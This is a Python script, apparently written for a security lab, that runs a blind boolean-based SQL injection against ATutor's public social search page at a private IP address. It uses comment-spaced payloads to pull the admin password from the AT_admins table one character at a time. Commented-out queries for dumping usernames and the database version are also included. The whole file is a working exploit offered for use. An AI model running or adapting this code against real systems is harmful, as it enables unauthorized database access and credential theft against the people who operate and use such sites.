import requests
import re
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
from bs4 import BeautifulSoup
from colorama import Fore, Back, Style
import pdb

def searchFriends_sqli(ip):
    try:
        r = requests.get(ip,verify=False,timeout=10)

        conetnt_length = int(r.headers['Content-Length'])
        result = r.content.decode()

        error = re.search("Invalid argument",result)
        if error:
            print("something wrong with payload")
            sys.exit()
        else:
            if conetnt_length > 20:
                return True
            elif conetnt_length == 20:
                return False

    except Exception as e:
        return e


def database_version(query,ascii_str,counts):

    inj_payload = rf"(select/**/ascii(substring(({query}),{counts},1)))={ascii_str}"
    payload = rf"AAAA')/**/or/**/{inj_payload}%23"
    #print(payload)
    target = target = f"http://192.168.31.168:8080/atutor/mods/_standard/social/index_public.php?q={payload}"
    #print(target)
    searchFriends_sqli(target)
    if searchFriends_sqli(target):
        return ascii_str


def main():

    #query = r"select/**/login/**/from/**/AT_admins/**/where/**/status=3/**/limit/**/1"  #dump user name
    query = r"select/**/password/**/from/**/AT_admins/**/where/**/login/**/=/**/'admin'" #dump password, admin could be any user
    #query = r"select/**/version()"


    for counts in range(1,41):  #range 1,12 if for username 
        for ascii_str in range(32,126):
            if database_version(query,ascii_str,counts):
                extracted_char = chr(ascii_str)
                sys.stdout.write(extracted_char)
                sys.stdout.flush()

if __name__ == '__main__':
    main()